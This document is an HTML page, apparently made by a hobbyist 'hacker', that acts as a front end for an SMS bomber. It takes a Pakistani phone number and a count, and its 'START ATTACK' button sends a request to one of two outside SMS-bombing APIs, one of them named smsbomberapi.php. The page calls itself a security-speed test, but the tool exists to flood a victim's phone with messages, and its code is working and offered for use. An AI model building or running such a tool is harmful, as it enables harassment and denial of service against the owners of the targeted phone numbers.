<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKER - QADEER</title>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background: white;
      color: #e0e0e0; 
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
    }
    nav {
      width: 100%;
      background: rgba(0, 255, 136, 0.12);
      backdrop-filter: blur(10px);
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 30px;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
    }
    nav h1 {
      font-size: 22px;
      color: #00ff88; 
      text-shadow: 0 0 10px #00ff88;
    }
    nav ul {
      list-style: none;
      display: flex;
      gap: 25px;
    }
    nav ul li a {
      cursor: pointer;
      font-size: 16px;
      color: #ff00ff; 
      text-decoration: none;
      transition: color 0.3s, text-shadow 0.3s;
    }
    nav ul li a:hover {
      color: #00ffff; 
      text-shadow: 0 0 10px #00ffff;
    }
    .card {
      margin-top: 40px;
      background: rgba(255,255,255,0.06);
      backdrop-filter: blur(12px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 40px rgba(255,0,255,0.4);
      width: 380px;
      text-align: center;
      animation: fadeIn 1.2s ease;
    }
    .card h2 {
      margin-bottom: 20px;
      color: #00ffff;
      text-shadow: 0 0 12px #00ffff;
    }
    input[type="text"], input[type="number"] {
      width: 90%;
      margin: 12px 0;
      padding: 12px;
      border: 1px solid #00ff88;
      border-radius: 12px;
      background: rgba(0,0,0,0.7);
      color: #fff;
      font-size: 16px;
      box-shadow: 0 0 10px rgba(0,255,136,0.5);
      outline: none;
    }
    button {
      margin-top: 18px;
      width: 95%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(45deg, #ff00ff, #00ffff);
      color: #000;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 0 20px #ff00ff;
    }
    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px #00ffff;
    }
    #status {
      margin-top: 20px;
      padding: 12px;
      border-radius: 10px;
      background: rgba(0,0,0,0.5);
      min-height: 40px;
      max-height: 120px;
      overflow-y: auto;
      font-size: 14px;
      white-space: pre-line;
      color: #ff00ff;
      text-align: left;
    }
    .server-selection {
      margin-top: 15px;
      padding: 10px;
      border: 1px solid #ff00ff;
      border-radius: 10px;
    }
    .server-selection h4 {
      margin: 0 0 10px 0;
      color: #00ffff;
      text-align: left;
    }
    .server-selection div {
      display: flex;
      justify-content: space-around;
      color: #fff;
      font-size: 15px;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <nav>
    <h1>üòé QADEER_KHAN üòé</h1>
    <ul>
      <li><a href="https://wa.me/923151105391" target="_blank">Contact</a></li>
    </ul>
  </nav>

  <div class="card">
    <h2>üöÄ TESTING SECURITY SPEED üöÄ</h2>
    
    <div class="server-selection">
      <h4>Select Your Server:</h4>
      <div>
        <label><input type="radio" name="server" value="server1"> Server 1</label>
        <label><input type="radio" name="server" value="server2"> Server 2</label>
      </div>
    </div>

    <input type="text" id="number" placeholder="Enter Number e.g 315xxxxxxx" required pattern="3[0-9]{9}" title="Number must start with 3 and be 10 digits long.">
    <input type="number" id="amount" placeholder="Enter Amount" required min="1">
    
    <button onclick="startAttack()">START ATTACK</button>
    
    <div id="status">Status: Waiting...</div>
  </div>

  <script>
    async function startAttack() {
      const number = document.getElementById("number").value.trim();
      const amount = document.getElementById("amount").value.trim();
      const statusBox = document.getElementById("status");
      
      const selectedServer = document.querySelector('input[name="server"]:checked');

      if (!selectedServer) {
        statusBox.textContent = "‚ö†Ô∏è Please select a server first!";
        return;
      }
      
      if (!number || !/3[0-9]{9}/.test(number)) {
        statusBox.textContent = "‚ö†Ô∏è Required number must start with 3 and be 10 digits.";
        return;
      }

      if (!amount || parseInt(amount) < 1) {
        statusBox.textContent = "‚ö†Ô∏è Count (Amount) is required!";
        return;
      }

      const serverValue = selectedServer.value;
      const serverName = selectedServer.parentElement.textContent.trim();
      statusBox.textContent = `üöÄ Sending task to ${serverName}...`;
      
      let url = '';
      if (serverValue === 'server1') {
        // Server 1 ki API ko amount pass kiya
        url = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
      } else {
        // Server 2 ki API ko bhi amount pass kiya
        url = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=92${number}&amount=1`;
      }
      
      try {
        // Loop khatam kar diya, ab sirf aik request jaye gi
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error(`Server responded with status: ${response.status}`);
        }
        statusBox.textContent += `\n\n‚úÖ Task successfully sent to ${serverName}!`;
      } catch (err) {
        statusBox.textContent += `\n\n‚ùå Failed to send task to ${serverName}.`;
        console.error(err);
      }
      statusBox.scrollTop = statusBox.scrollHeight;
    }
  </script>

</html>
